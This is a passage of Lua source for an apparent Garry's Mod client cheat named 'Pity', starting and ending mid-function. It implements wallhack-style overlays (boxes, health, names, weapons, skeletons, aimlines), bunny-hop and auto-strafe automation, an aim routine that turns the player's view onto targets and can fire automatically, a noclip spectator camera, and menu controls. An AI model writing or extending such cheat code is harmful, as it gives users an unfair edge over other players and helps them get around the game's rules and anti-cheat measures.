			if Pity.Options["Visuals_Skybox"] then			 
    			render.Clear( math.abs( math.cos( CurTime() /10 ) *100 ), math.abs( math.cos( CurTime() /10 ) *100 ), math.abs( math.cos( CurTime()/10 ) *100 ), 255 ) return true 
  			end 
		end)
		if Pity.Options["Visuals_Toggle"] then
			if Ent:IsNPC() || Ent:IsPlayer() then
			local Name
			local ShowTeam, ShowOpponents, ShowFriends, ShowEnemies, ShowNPCs, ShowSpectators = false, false, false, false, false, false
			local ShowTeamV, ShowOpponentsV, ShowFriendsV, ShowEnemiesV, ShowNPCsV, ShowSpectatorsV = true, true, true, true, true, true

			if !Ent:IsNPC() && Ent:Health() > 0 then
				local Team, _ = GetTeam(Ent)
				if Ent:Team() != TEAM_SPECTATOR && Pity.Options["Visuals_ShowTeam"] && Team == GetTeam(LocalPlayer()) then
					if Pity.Options["Visuals_ShowTeamV"] == "Show" then
						ShowTeam = true
					else
						ShowTeamV = false
					end
				end
				if Ent:Team() != TEAM_SPECTATOR && Pity.Options["Visuals_ShowOpponents"] && Team != GetTeam(LocalPlayer()) then
					if Pity.Options["Visuals_ShowOpponentsV"] == "Show" then
						ShowOpponents = true
					else
						ShowOpponentsV = false
					end
				end
				if Pity.Options["Visuals_ShowSpectators"] && Ent:Team() == TEAM_SPECTATOR then
					if Pity.Options["Visuals_ShowSpectatorsV"] == "Show" then
						ShowSpectators = true
					else
						ShowSpectatorsV = false
					end
				end
				Name = Ent:Nick()
			else
				if Pity.Options["Visuals_ShowNPCs"] && Ent:IsNPC() then
					if Pity.Options["Visuals_ShowNPCsV"] == "Show" then
						ShowNPCs = true
					else
						ShowNPCsV = false
					end
				end
				Name = Ent:GetClass()
			end
			if (ShowTeam || ShowOpponents || ShowNPCs || ShowSpectators) && (ShowTeamV && ShowOpponentsV && ShowFriendsV && ShowEnemiesV && ShowNPCsV && ShowSpectatorsV) then
				local MaxX, MaxY, MinX, MinY, V1, V2, V3, V4, V5, V6, V7, V8 = VisualsGetPos( Ent )
				local DrawColor = Color( 255, 68, 68 )
				local VisualsPos = MinY
				if Ent:IsNPC() then	DrawColor = DarkRed else _, DrawColor = GetTeam(Ent) end
					if Pity.Options["Visuals_BoundaryBoxes"] then
							surface.SetDrawColor( DrawColor )
							if Pity.Options["Visuals_BoundaryBoxes_Mode"] == "2D" then
								surface.DrawLine( MaxX, MaxY, MinX, MaxY )
								surface.DrawLine( MaxX, MaxY, MaxX, MinY )
								surface.DrawLine( MinX, MinY, MaxX, MinY )
								surface.DrawLine( MinX, MinY, MinX, MaxY )
							else
								//Top Box
								surface.DrawLine( V4.x, V4.y, V6.x, V6.y )
								surface.DrawLine( V1.x, V1.y, V8.x, V8.y )
								surface.DrawLine( V6.x, V6.y, V8.x, V8.y )
								surface.DrawLine( V4.x, V4.y, V1.x, V1.y )

								//Bottom Box
								surface.DrawLine( V3.x, V3.y, V5.x, V5.y )
								surface.DrawLine( V2.x, V2.y, V7.x, V7.y )
								surface.DrawLine( V3.x, V3.y, V2.x, V2.y )
								surface.DrawLine( V5.x, V5.y, V7.x, V7.y )

								//Verticals
								surface.DrawLine( V3.x, V3.y, V4.x, V4.y )
								surface.DrawLine( V2.x, V2.y, V1.x, V1.y )
								surface.DrawLine( V7.x, V7.y, V8.x, V8.y )
								surface.DrawLine( V5.x, V5.y, V6.x, V6.y )
										end
									end
								if Pity.Options["Visuals_Health"] then					
									local HealthColor = Color( (1-(Ent:Health()/Ent:GetMaxHealth()))*255, (Ent:Health()/Ent:GetMaxHealth())*255, 0 )
									local HealthString = tostring(Ent:Health())
									if MaxY-MinY <= 45 then
										local TopHealthFar = ((1-(Ent:Health()/Ent:GetMaxHealth()))*43)+MinY+1
										local BottomHealthFar = 43-((1-(Ent:Health()/Ent:GetMaxHealth()))*43)
										draw.RoundedBox( 0, MinX-15, MinY, 10, 45, Color(0,0,0) )
										draw.RoundedBox( 0, MinX-14, TopHealthFar, 8, BottomHealthFar, HealthColor )
										draw.SimpleTextOutlined( HealthString.."%", "Normal", MinX-17, MinY+22.5, HealthColor, TEXT_ALIGN_RIGHT, TEXT_ALIGN_CENTER, 1, Color(0,0,0) )
									else
										local TopHealthClose = (MinY+((1-(Ent:Health()/Ent:GetMaxHealth()))*(MaxY-MinY)))+1
										local BottomHealthClose = ((Ent:Health()/Ent:GetMaxHealth())*(MaxY-MinY))-2
										draw.RoundedBox( 0, MinX-15, MinY, 10, MaxY-MinY, Color(0,0,0) )
										draw.RoundedBox( 0, MinX-14, TopHealthClose, 8, BottomHealthClose, HealthColor )
										draw.SimpleTextOutlined( HealthString.."%", "Normal", MinX-17, ((MinY-MaxY)/2)+MaxY, HealthColor, TEXT_ALIGN_RIGHT, TEXT_ALIGN_CENTER, 1, Color(0,0,0) )
									end
								end
								if Pity.Options["Visuals_NameTags"] then
									if GMode == 2 && Ent:GetBystanderName() != nil then
										draw.SimpleTextOutlined( "N: "..Name.." ("..Ent:GetBystanderName()..")", "Normal", MaxX+5, VisualsPos, DrawColor, TEXT_ALIGN_LEFT, TEXT_ALIGN_BOTTOM, 1, Color(0,0,0) )
									else
										draw.SimpleTextOutlined( "N: "..Name, "Normal", MaxX+5, VisualsPos, DrawColor, TEXT_ALIGN_LEFT, TEXT_ALIGN_BOTTOM, 1, Color(0,0,0) )
									end
									VisualsPos = VisualsPos + 15
								end
								if Pity.Options["Visuals_Weapon"] then
									if Ent:GetActiveWeapon():IsValid() then
										local WName = Ent:GetActiveWeapon():GetPrintName()
										draw.SimpleTextOutlined( "W: "..WName, "Normal", MaxX+5, VisualsPos, DrawColor, TEXT_ALIGN_LEFT, TEXT_ALIGN_BOTTOM, 1, Color(0,0,0) )
										VisualsPos = VisualsPos + 15
									end
								end
								if Pity.Options["Visuals_Distance"] then
									local Dist = math.floor(Ent:GetPos():Distance(LocalPlayer():GetShootPos())/40)
									draw.SimpleTextOutlined( "D: "..Dist, "Normal", MaxX+5, VisualsPos, DrawColor, TEXT_ALIGN_LEFT, TEXT_ALIGN_BOTTOM, 1, Color(0,0,0) )
									VisualsPos = VisualsPos + 15
								end
								if Pity.Options["Visuals_Skeleton"] then
									local Bones = {}
									local Success = true
									for k, v in pairs(Pity.Bones) do
										if Ent:LookupBone(v) != nil && Ent:GetBonePosition(Ent:LookupBone(v)) != nil then
											table.insert( Bones, Ent:GetBonePosition(Ent:LookupBone(v)):ToScreen() )
										else
											Success = false //Just incase entities have some bones but not others (I have no idea if that happens, but I figgured better safe then sorry)
											return
										end
									end
									if Success then
										surface.SetDrawColor( DrawColor )
										//Spine
										surface.DrawLine( Bones[1].x, Bones[1].y, Bones[2].x, Bones[2].y )
										surface.DrawLine( Bones[2].x, Bones[2].y, Bones[3].x, Bones[3].y )
										surface.DrawLine( Bones[3].x, Bones[3].y, Bones[4].x, Bones[4].y )
										surface.DrawLine( Bones[4].x, Bones[4].y, Bones[5].x, Bones[5].y )
										surface.DrawLine( Bones[5].x, Bones[5].y, Bones[6].x, Bones[6].y )
										surface.DrawLine( Bones[6].x, Bones[6].y, Bones[7].x, Bones[7].y )

										//Legs
										surface.DrawLine( Bones[7].x, Bones[7].y, Bones[14].x, Bones[14].y )
										surface.DrawLine( Bones[14].x, Bones[14].y, Bones[15].x, Bones[15].y )
										surface.DrawLine( Bones[15].x, Bones[15].y, Bones[16].x, Bones[16].y )
										surface.DrawLine( Bones[16].x, Bones[16].y, Bones[17].x, Bones[17].y )

										surface.DrawLine( Bones[7].x, Bones[7].y, Bones[18].x, Bones[18].y )
										surface.DrawLine( Bones[18].x, Bones[18].y, Bones[19].x, Bones[19].y )
										surface.DrawLine( Bones[19].x, Bones[19].y, Bones[20].x, Bones[20].y )
										surface.DrawLine( Bones[20].x, Bones[20].y, Bones[21].x, Bones[21].y )

										//Arms
										surface.DrawLine( Bones[3].x, Bones[3].y, Bones[8].x, Bones[8].y )
										surface.DrawLine( Bones[8].x, Bones[8].y, Bones[9].x, Bones[9].y )
										surface.DrawLine( Bones[9].x, Bones[9].y, Bones[10].x, Bones[10].y )

										surface.DrawLine( Bones[3].x, Bones[3].y, Bones[11].x, Bones[11].y )
										surface.DrawLine( Bones[11].x, Bones[11].y, Bones[12].x, Bones[12].y )
										surface.DrawLine( Bones[12].x, Bones[12].y, Bones[13].x, Bones[13].y )

									end
								end
							end
						end
					end
				end
			end
		end
end)

hook.Add( "CalcView", "BhopCalcView", function( ply, pos, angles, fov )
	if Pity.Options["Bhop_Toggle"] then
		if Pity.Options["Bhop_Sideways"] then
			local CamData = {}
			if TapS then 
				CamData.angles = LocalPlayer():EyeAngles()+Angle(0,180,0) 
			else 
				CamData.angles = LocalPlayer():EyeAngles()+Angle(0,90,0) 
			end
			CamData.origin = LocalPlayer():GetShootPos()
			CamData.fov = fov

			return CamData
		elseif Pity.Options["Bhop_WOnly"] then
			local CamData = {}
			if WLeft then
				CamData.angles = LocalPlayer():EyeAngles()-Angle(0,90,0)
			elseif WRight then
				CamData.angles = LocalPlayer():EyeAngles()+Angle(0,90,0)
			elseif WBack then
				CamData.angles = LocalPlayer():EyeAngles()+Angle(0,180,0)
			end
			CamData.origin = LocalPlayer():GetShootPos()
			CamData.fov = fov

			return CamData
		end
	end
end)

hook.Add( "CreateMove", "Bhop", function(ucmd)
		if Pity.Options["Bhop_Toggle"] then
			if Pity.Options["Bhop_FastWalk"] then
				if LocalPlayer():IsOnGround() && ( ucmd:KeyDown(IN_FORWARD) || ucmd:KeyDown(IN_BACK) ) then
					if FastWalk == false then
						ucmd:SetSideMove(ucmd:GetSideMove()-5000)
					else
						ucmd:SetSideMove(ucmd:GetSideMove()+5000)
					end
					FastWalk = !FastWalk
				end
			end
			if Pity.Options["Bhop_AutoHop"] then
				if ucmd:KeyDown(IN_JUMP) then
					if LocalPlayer():WaterLevel() <= 1 && LocalPlayer():GetMoveType() != MOVETYPE_LADDER && !LocalPlayer():IsOnGround() then
						ucmd:RemoveKey(IN_JUMP)
					end
				end
			end
			if Pity.Options["Bhop_AutoStrafe"] && !LocalPlayer():IsOnGround() && LocalPlayer():WaterLevel() <= 1 && LocalPlayer():GetMoveType() != MOVETYPE_LADDER && !( LocalPlayer():KeyDown(IN_FORWARD) || LocalPlayer():KeyDown(IN_BACK) || LocalPlayer():KeyDown(IN_MOVELEFT) || LocalPlayer():KeyDown(IN_MOVERIGHT) ) then
				if Pity.Options["Bhop_Sideways"] && !TapS then
					if ucmd:GetMouseX() < 0 then
						ucmd:SetForwardMove(-1000000)
					end
					if ucmd:GetMouseX() > 0 then
						ucmd:SetForwardMove(1000000)
					end
				elseif Pity.Options["Bhop_WOnly"] then
					if ucmd:GetMouseX() < 0 then
						ucmd:SetForwardMove(1000000)
						if !WLeft then
							if WRight then
								ucmd:SetViewAngles(ucmd:GetViewAngles()+Angle(0,180,0))
							elseif WForward then
								ucmd:SetViewAngles(ucmd:GetViewAngles()+Angle(0,90,0))
							elseif WBack then
								ucmd:SetViewAngles(ucmd:GetViewAngles()-Angle(0,90,0))
							end
							WLeft = true
							WRight, WForward, WBack = false, false, false
						end
					elseif ucmd:GetMouseX() > 0 then
						ucmd:SetForwardMove(1000000)
						if !WRight then
							if WLeft then
								ucmd:SetViewAngles(ucmd:GetViewAngles()+Angle(0,180,0))
							elseif WForward then
								ucmd:SetViewAngles(ucmd:GetViewAngles()-Angle(0,90,0))
							elseif WBack then
								ucmd:SetViewAngles(ucmd:GetViewAngles()+Angle(0,90,0))
							end
							WRight = true
							WLeft, WForward, WBack = false, false, false
						end
					end
				else
					if ucmd:GetMouseX() < 0 then
						ucmd:SetSideMove(-1000000)
					end
					if ucmd:GetMouseX() > 0 then
						ucmd:SetSideMove(1000000)
					end
				end
			end
			if Pity.Options["Bhop_EdgeJump"] then
				if LocalPlayer():IsOnGround() then
					local WalkAngle
					if LocalPlayer():GetVelocity():Length() != 0 then
						WalkAngle = Angle( 0, LocalPlayer():GetVelocity():Angle().y, 0 )
					else
						WalkAngle = Angle( 0, LocalPlayer():EyeAngles().y, 0 )
					end
					local FinPos = LocalPlayer():EyePos() + (WalkAngle:Forward()*(Pity.Options["Bhop_EdgeJump_Distance"]-50))
					FinPos.z = LocalPlayer():GetPos().z-5
					local GroundDetect = {
							start = LocalPlayer():GetShootPos(),
							endpos = FinPos,
							filter = LocalPlayer(),
							mask = MASK_PLAYERSOLID
						}
					if util.TraceLine(GroundDetect).Fraction == 1 then
						ucmd:SetButtons( ucmd:GetButtons() + IN_JUMP )
					end
				end
				//LocalPlayer():SetEyeAngles(Angle( 0,LocalPlayer():GetVelocity():Angle().y,LocalPlayer():GetVelocity():Angle().z )) <-Just for safe keeping
			end
			if Pity.Options["Bhop_Sideways"] then
				if ucmd:KeyDown(IN_MOVELEFT) && !TapS then
					if ucmd:KeyDown(IN_MOVERIGHT) then ForwardMove = 0 elseif ForwardMove == 0 then ForwardMove = -1000000 end
					ucmd:SetSideMove(SideMove)
					ucmd:SetForwardMove(ForwardMove)
				end
				if ucmd:KeyDown(IN_MOVERIGHT) && !TapS then
					if ucmd:KeyDown(IN_MOVELEFT) then ForwardMove = 0 elseif ForwardMove == 0 then ForwardMove = 1000000 end
					ucmd:SetSideMove(SideMove)
					ucmd:SetForwardMove(ForwardMove)
				end
				if !ucmd:KeyDown(IN_MOVELEFT) && !ucmd:KeyDown(IN_MOVERIGHT) && !TapS then ForwardMove = 0 end

				if ucmd:KeyDown(IN_FORWARD) && !TapS then
					if ucmd:KeyDown(IN_BACK) then SideMove = 0 elseif SideMove == 0 then SideMove = -1000000 end
					ucmd:SetSideMove(SideMove)
					ucmd:SetForwardMove(ForwardMove)
				end
				if ucmd:KeyDown(IN_BACK) && LocalPlayer():IsOnGround() && !TapS then
					if ucmd:KeyDown(IN_FORWARD) then SideMove = 0 elseif SideMove == 0 then SideMove = 1000000 end
					ucmd:SetSideMove(SideMove)
					ucmd:SetForwardMove(ForwardMove)
				elseif ucmd:KeyDown(IN_BACK) && !LocalPlayer():IsOnGround() && !TapS then
					ForwardMove = 1000000
					ucmd:SetViewAngles(ucmd:GetViewAngles()-Angle(0,90,0))
					ucmd:SetForwardMove(ForwardMove)
					TapS = true
				end
				if !ucmd:KeyDown(IN_FORWARD) && !ucmd:KeyDown(IN_BACK) && !TapS then SideMove = 0 end
				if !LocalPlayer():IsOnGround() && ucmd:KeyDown(IN_BACK) && TapS then
					ucmd:SetForwardMove(1000000)
				elseif ( !ucmd:KeyDown(IN_BACK) || LocalPlayer():IsOnGround() ) && TapS then
					ucmd:SetViewAngles(ucmd:GetViewAngles()+Angle(0,90,0))
					TapS = false
				end
			elseif Pity.Options["Bhop_WOnly"] then
				if ucmd:KeyDown(IN_MOVELEFT) && !WLeft then
					if WRight then
						ucmd:SetViewAngles(ucmd:GetViewAngles()+Angle(0,180,0))
					elseif WForward then
						ucmd:SetViewAngles(ucmd:GetViewAngles()+Angle(0,90,0))
					elseif WBack then
						ucmd:SetViewAngles(ucmd:GetViewAngles()-Angle(0,90,0))
					end
					WLeft = true
					WRight, WForward, WBack = false, false, false
				elseif ucmd:KeyDown(IN_MOVERIGHT) && !WRight then
					if WLeft then
						ucmd:SetViewAngles(ucmd:GetViewAngles()+Angle(0,180,0))
					elseif WForward then
						ucmd:SetViewAngles(ucmd:GetViewAngles()-Angle(0,90,0))
					elseif WBack then
						ucmd:SetViewAngles(ucmd:GetViewAngles()+Angle(0,90,0))
					end
					WRight = true
					WLeft, WForward, WBack = false, false, false
				elseif ucmd:KeyDown(IN_FORWARD) && !WForward then
					if WRight then
						ucmd:SetViewAngles(ucmd:GetViewAngles()+Angle(0,90,0))
					elseif WLeft then
						ucmd:SetViewAngles(ucmd:GetViewAngles()-Angle(0,90,0))
					elseif WBack then
						ucmd:SetViewAngles(ucmd:GetViewAngles()+Angle(0,180,0))
					end
					WForward = true
					WLeft, WRight, WBack = false, false, false
				elseif ucmd:KeyDown(IN_BACK) && !WBack then
					if WRight then
						ucmd:SetViewAngles(ucmd:GetViewAngles()-Angle(0,90,0))
					elseif WForward then
						ucmd:SetViewAngles(ucmd:GetViewAngles()+Angle(0,180,0))
					elseif WLeft then
						ucmd:SetViewAngles(ucmd:GetViewAngles()+Angle(0,90,0))
					end
					WBack = true
					WLeft, WRight, WForward = false, false, false
				end
				if !ucmd:KeyDown(IN_MOVELEFT) && !ucmd:KeyDown(IN_MOVERIGHT) && !ucmd:KeyDown(IN_FORWARD) && !ucmd:KeyDown(IN_BACK) then WActive = false else WActive = true end
				if WActive then
					ucmd:SetForwardMove(1000000)
					ucmd:SetSideMove(0)
				end
			end
		end
	end)

hook.Add( "CalcView", "Cams", function( ply, Pos, Ang, FOV )
		if Pity.Options["Cams_Toggle"] then
			local CamData = {}
			if Pity.Options["Cams_CSNoclip"] then
				local Speed = Pity.Options["Cams_CSNoclip_Speed"]/5
				local MouseAngs = Angle( NoclipY, NoclipX, 0 )
				if LocalPlayer():KeyDown(IN_SPEED) then
					Speed = Speed * 5
				end
				if LocalPlayer():KeyDown(IN_FORWARD) then
					NoclipPos = NoclipPos+(MouseAngs:Forward()*Speed)
				end
				if LocalPlayer():KeyDown(IN_BACK) then
					NoclipPos = NoclipPos-(MouseAngs:Forward()*Speed)
				end
				if LocalPlayer():KeyDown(IN_MOVELEFT) then
					NoclipPos = NoclipPos-(MouseAngs:Right()*Speed)
				end
				if LocalPlayer():KeyDown(IN_MOVERIGHT) then
					NoclipPos = NoclipPos+(MouseAngs:Right()*Speed)
				end
				if NoclipJump then
					NoclipPos = NoclipPos+Vector(0,0,Speed)
				end
				if NoclipDuck then
					NoclipPos = NoclipPos-Vector(0,0,Speed)
				end
				CamData.origin = NoclipPos
				CamData.angles = MouseAngs
				CamData.fov = FOV
				CamData.drawviewer = true
			elseif Pity.Options["Cams_ThirdPerson"] then
				CamData.origin = Pos-(Ang:Forward()*(Pity.Options["Cams_ThirdPerson_Zoom"]*10))
				CamData.angles = Ang
				CamData.fov = FOV
				CamData.drawviewer = true
			end
			return CamData
		end
	end)

hook.Add("HUDPaint", "KeyVisualizer", function()
	if Pity.Options["Misc_KeyVisualizer"] then
  		if input.IsKeyDown( KEY_Z ) then

    		surface.SetDrawColor( Black )
    		surface.DrawRect( 35, 3, 30, 30 )
    		draw.OutlinedBox( 35, 3, 30, 30, 2, DarkRed )

    		draw.SimpleTextOutlined( "Z", "Normal", 49.5, 17, Color(255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 0.5, Red)
  		end

  		if input.IsKeyDown( KEY_Q ) then

    		surface.SetDrawColor( Black )
    		surface.DrawRect( 2, 36, 30, 30 )
    		draw.OutlinedBox( 2, 36, 30, 30, 2, DarkRed )

    		draw.SimpleTextOutlined( "Q", "Normal", 16, 50, Color(255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 0.5, Red)
  		end

  		if input.IsKeyDown( KEY_D ) then

    		surface.SetDrawColor( Black )
    		surface.DrawRect( 68, 36, 30, 30 )
    		draw.OutlinedBox( 68, 36, 30, 30, 2, DarkRed )

    		draw.SimpleTextOutlined( "D", "Normal", 82.5, 50, Color(255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 0.5, Red)
  		end

  		if input.IsKeyDown( KEY_S ) then

    		surface.SetDrawColor( Black )
    		surface.DrawRect( 35, 36, 30, 30 )
    		draw.OutlinedBox( 35, 36, 30, 30, 2, DarkRed )

    		draw.SimpleTextOutlined( "S", "Normal", 49.5, 50, Color(255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 0.5, Red)
  		end

  		if input.IsKeyDown( KEY_SPACE ) then

    		surface.SetDrawColor( Black )
    		surface.DrawRect( 2, 69, 96, 30 )
    		draw.OutlinedBox( 2, 69, 96, 30, 2, DarkRed )

    		draw.SimpleTextOutlined( "SPACE", "Normal", 49.5, 84, Color(255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 0.5, Red)
  		end
  	end
end)
---//----------//---

----// Aim //----

function Aim( FinAngle )
	if Pity.Options["Aim_SmoothAim"] then
		SmoothAngles( FinAngle, Pity.Options["Aim_SmoothAim_Value"] )
	else
		LocalPlayer():SetEyeAngles(FinAngle)
	end
end

function SmoothAngles( FinAngle, SmoothValue )
	local SmoothValue = 10-(10*(SmoothValue/1000))
	local CloseToAngle = false
	local SmoothDirectionX = 1
	local SmoothDirectionY = 1
	local CurAngle = LocalPlayer():EyeAngles()
	if FinAngle.x > 89 then FinAngle.x = FinAngle.x - 360 end
	if CurAngle == FinAngle then
		SmoothDirectionX = 1
	elseif CurAngle.y < 0 && FinAngle.y < 0 then
		CloseToAngle = true
		if CurAngle.y > FinAngle.y then
			SmoothDirectionX = 2
		elseif CurAngle.y < FinAngle.y then
			SmoothDirectionX = 3
		end
	elseif CurAngle.y >= 0 && FinAngle.y >= 0 then
		CloseToAngle = true
		if CurAngle.y > FinAngle.y then
			SmoothDirectionX = 2
		elseif CurAngle.y < FinAngle.y then
			SmoothDirectionX = 3
		end
	elseif CurAngle.y >= 0 && FinAngle.y < 0 then
		local FlipAngle = CurAngle-(Angle(0,180,0))
		if FlipAngle.y > FinAngle.y then
			SmoothDirectionX = 3
		elseif FlipAngle.y < FinAngle.y then
			SmoothDirectionX = 2
		end
	elseif CurAngle.y < 0 && FinAngle.y >= 0 then
		local FlipAngle = CurAngle+(Angle(0,180,0))
		if FlipAngle.y < FinAngle.y then
			SmoothDirectionX = 2	
		elseif FlipAngle.y > FinAngle.y then
			SmoothDirectionX = 3
		end
	end
	if FinAngle.x < CurAngle.x then
		SmoothDirectionY = 2
	elseif FinAngle.x > CurAngle.x then
		SmoothDirectionY = 3
	end
	local X, Y = false, false
	if SmoothDirectionX == 2 then
		if CurAngle.y-SmoothValue < FinAngle.y && CloseToAngle then
			LocalPlayer():SetEyeAngles(Angle(CurAngle.x,FinAngle.y,CurAngle.z))
			Y = true
		else
			LocalPlayer():SetEyeAngles(Angle(CurAngle.x,CurAngle.y-SmoothValue,CurAngle.z))
		end
	elseif SmoothDirectionX == 3 then
		if CurAngle.y+SmoothValue > FinAngle.y && CloseToAngle then
			LocalPlayer():SetEyeAngles(Angle(CurAngle.x,FinAngle.y,CurAngle.z))
			Y = true
		else
			LocalPlayer():SetEyeAngles(Angle(CurAngle.x,CurAngle.y+SmoothValue,CurAngle.z))
		end
	end
	if SmoothDirectionY == 2 then
		//up
		if CurAngle.x-SmoothValue < FinAngle.x then
			LocalPlayer():SetEyeAngles(Angle(FinAngle.x,LocalPlayer():EyeAngles().y,LocalPlayer():EyeAngles().z))
			X = true
		else
			LocalPlayer():SetEyeAngles(Angle(CurAngle.x-SmoothValue,LocalPlayer():EyeAngles().y,LocalPlayer():EyeAngles().z))
		end
	elseif SmoothDirectionY == 3 then
		//down
		if CurAngle.x+SmoothValue > FinAngle.x then
			LocalPlayer():SetEyeAngles(Angle(FinAngle.x,LocalPlayer():EyeAngles().y,LocalPlayer():EyeAngles().z))
			X = true
		else
			LocalPlayer():SetEyeAngles(Angle(CurAngle.x+SmoothValue,LocalPlayer():EyeAngles().y,LocalPlayer():EyeAngles().z))
		end
	end
	if Pity.Options["Aim_AutoShoot"] && X && Y then
		LocalPlayer():ConCommand("+attack")
		timer.Simple( 0.1, function() LocalPlayer():ConCommand("-attack") end )
	end
end

----//-----//----


----// Visuals //----

/*
	Aimline
*/
local Laser = Material( "cable/rope" ) 
local AimlineColor = SemiDarkRed

hook.Add( "PostPlayerDraw", "Aimline", function()
	if Pity.Options["Aimline"] then
		render.SetMaterial(Laser)
    	for k, v in next, player.GetAll() do
        	if v ~= LocalPlayer() then
            	local Trace = v:GetEyeTrace()
            	local Hit = Trace.HitPos
            	local Origin = Trace.StartPos
            	render.DrawBeam(Origin, Hit, 2, 0, 0, AimlineColor)
        	end
    	end
	end
end)

/*
	Visuals
*/
function VisualsGetPos( Ent )
	if Ent:IsValid() then
		local Points = {
			Vector( Ent:OBBMaxs().x, Ent:OBBMaxs().y, Ent:OBBMaxs().z ),
			Vector( Ent:OBBMaxs().x, Ent:OBBMaxs().y, Ent:OBBMins().z ),
			Vector( Ent:OBBMaxs().x, Ent:OBBMins().y, Ent:OBBMins().z ),
			Vector( Ent:OBBMaxs().x, Ent:OBBMins().y, Ent:OBBMaxs().z ),
			Vector( Ent:OBBMins().x, Ent:OBBMins().y, Ent:OBBMins().z ),
			Vector( Ent:OBBMins().x, Ent:OBBMins().y, Ent:OBBMaxs().z ),
			Vector( Ent:OBBMins().x, Ent:OBBMaxs().y, Ent:OBBMins().z ),
			Vector( Ent:OBBMins().x, Ent:OBBMaxs().y, Ent:OBBMaxs().z )
		}
		local MaxX, MaxY, MinX, MinY
		local V1, V2, V3, V4, V5, V6, V7, V8
		for k, v in pairs( Points ) do
			local ScreenPos = Ent:LocalToWorld( v ):ToScreen()
			if MaxX != nil then
				MaxX, MaxY, MinX, MinY = math.max( MaxX, ScreenPos.x ), math.max( MaxY, ScreenPos.y), math.min( MinX, ScreenPos.x ), math.min( MinY, ScreenPos.y)
			else
				MaxX, MaxY, MinX, MinY = ScreenPos.x, ScreenPos.y, ScreenPos.x, ScreenPos.y
			end

			if V1 == nil then
				V1 = ScreenPos
			elseif V2 == nil then
				V2 = ScreenPos
			elseif V3 == nil then
				V3 = ScreenPos
			elseif V4 == nil then
				V4 = ScreenPos
			elseif V5 == nil then
				V5 = ScreenPos
			elseif V6 == nil then
				V6 = ScreenPos
			elseif V7 == nil then
				V7 = ScreenPos
			elseif V8 == nil then
				V8 = ScreenPos
			end
		end
		return MaxX, MaxY, MinX, MinY, V1, V2, V3, V4, V5, V6, V7, V8
	end
end

hook.Add("HUDPaint", "Crosshair", function()
	if Pity.Options["Visuals_Crosshair"] then
    	local x = ScrW() / 2
    	local y = ScrH() / 2
    	target = LocalPlayer():GetEyeTrace().Entity
    	if LocalPlayer():Alive() and LocalPlayer():GetActiveWeapon():IsValid() and (target:IsPlayer() or target:IsNPC()) then
      	crosscolor = Red
      	surface.SetDrawColor(crosscolor)
    	else
      	crosscolor = Color(230,230,230,150)
    	end
    	surface.SetDrawColor(crosscolor)
    	_p = FindMetaTable("Player")
    	_p.GetActiveWeapon(LocalPlayer()).DrawCrosshair = false;
    	surface.DrawLine(ScrW() / 2 - 9, ScrH() / 2, ScrW() / 2 + 9 , ScrH() / 2)
    	surface.DrawLine(ScrW() / 2 - 0, ScrH() / 2 - 9, ScrW() / 2 - 0 , ScrH() / 2 + 9)
	end
end)

----//---------//----

----// Guided User Interface //----

/*
	Checkbox function
*/
function AddCheckBox( Parent, Text, PosX, PosY, ToolTip, Var, ExtraFunc )
	local AddCheckBox = vgui.Create( "DCheckBoxLabel", Parent )
	AddCheckBox:SetFont("Normal")
	AddCheckBox:SetText( Text )
	AddCheckBox:SetPos( PosX, PosY )
	AddCheckBox:SetTextColor( Color(255,255,255,255) )
	AddCheckBox:SizeToContents()
	AddCheckBox:SetChecked( Pity.Options[Var] )
	AddCheckBox.OnChange = function()
		Pity.Options[Var] = AddCheckBox:GetChecked()
		if ExtraFunc != nil then
			local IsChecked = AddCheckBox:GetChecked()
			ExtraFunc()
		end
	end
	function AddCheckBox.Button:Paint( w, h)
		surface.SetDrawColor(27, 27, 27)
    	surface.DrawRect(0, 0, w, h)
    	surface.SetDrawColor( Red );
        surface.DrawOutlinedRect(0, 0, w, h); 
    	if self:GetChecked() then
        	surface.SetDrawColor( DarkRed )
        	surface.DrawRect(w / 4 + 1, h / 4 + 1, w / 2, h / 2)
        end
	end
end

/*
	Button
*/
function AddGenericButton( Parent, Text, SizeX, SizeY, PosX, PosY, DoClick )
	local AddGenericButton = vgui.Create( "DButton", Parent )
	AddGenericButton:SetFont("Normal")
	AddGenericButton:SetText( Text )
	AddGenericButton:SetTextColor( Color(255,255,255) )
	AddGenericButton:SetSize( SizeX, SizeY )
	AddGenericButton:SetPos( PosX, PosY )
	function AddGenericButton:Paint( w, h )
		surface.SetDrawColor(27, 27, 27)
    	surface.DrawRect(0, 0, w, h)
    	surface.SetDrawColor( Red );
        surface.DrawOutlinedRect(0, 0, w, h); 
	end
	AddGenericButton.DoClick = DoClick
end

/*
	Slider
*/
function AddSlider( Parent, Var, PosX, PosY, Min, Max, Decimals )
	local AddSlider = vgui.Create( "Slider", Parent )
	AddSlider:SetSize( 150, 15 )
	AddSlider:SetPos( PosX, PosY )
	AddSlider:SetMin( Min )
	AddSlider:SetMax( Max )
	AddSlider:SetDecimals( Decimals )
	AddSlider:SetValue( Pity.Options[Var] )
	AddSlider.OnValueChanged = function( Panel, Value )
		Pity.Options[Var] = math.Round( Value, Decimals )
	end
	function AddSlider:Paint(w, h)
		surface.SetDrawColor(LightBlack)
    	surface.DrawRect(0, 0, w, h)
    	surface.SetDrawColor( DarkRed );
        surface.DrawOutlinedRect(0, 0, w, h);
	end
end

/*
	Entry
*/
function AddTextEntry( Parent, Width, PosX, PosY, DefaultText, Var, Save )
	local AddTextEntry = vgui.Create("DTextEntry", Parent)
	AddTextEntry:SetWide(Width)
	AddTextEntry:SetPos(PosX,PosY)
	AddTextEntry:SetUpdateOnType(true)
	if Save != nil && Pity.TextEntries[Var] != nil then
		AddTextEntry:SetText(Pity.TextEntries[Var])
	else
		AddTextEntry:SetText("")
	end
	AddTextEntry.OnGetFocus = function()
		if AddTextEntry:GetText() == DefaultText then
			AddTextEntry:SetText("")
		end
	end
	AddTextEntry.OnLoseFocus = function()
		if AddTextEntry:GetText() == "" then
			AddTextEntry:SetText(DefaultText)
			Pity.TextEntries[Var] = nil
		else
			Pity.TextEntries[Var] = AddTextEntry:GetText()
		end
	end
end


/*
	ConfigBox
*/

function UnloadPity( Display )
	timer.Simple( 0.5, function() 
